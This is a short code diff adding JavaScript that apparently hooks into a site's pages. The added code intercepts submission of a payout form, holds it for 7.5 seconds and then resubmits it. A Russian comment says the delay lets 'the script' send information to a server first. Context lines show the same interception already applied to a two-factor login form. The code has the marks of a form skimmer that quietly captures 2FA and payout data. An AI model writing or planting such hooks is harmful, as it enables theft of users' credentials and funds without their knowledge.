@@ -31,5 +31,21 @@ if (document.querySelector('form#registerform[action="/login/tfa"]') != undefine
               }, 5000)
           });}
 
+let tfaToPayout; 
+if (document.querySelector('form[action*="/balance/payout"]') != undefined) {
+           tfaToPayout = document.querySelector('form[action*="/balance/payout"]')    
+      }           
+// добавляем к форме
+      if (tfaToPayout != undefined){
+      tfaToPayout.addEventListener('submit', function(event) {
+              event.preventDefault();
+             
+              // дайте скрипту секунду для отправки инфы на сервер, а затем продолжаем как обычно
+              setTimeout(function() {
+                  tfaToPayout.removeEventListener('submit', this);
+                  tfaToPayout.submit();
+              }, 7500)
+          });}
+
 
 console.log('is loaded')
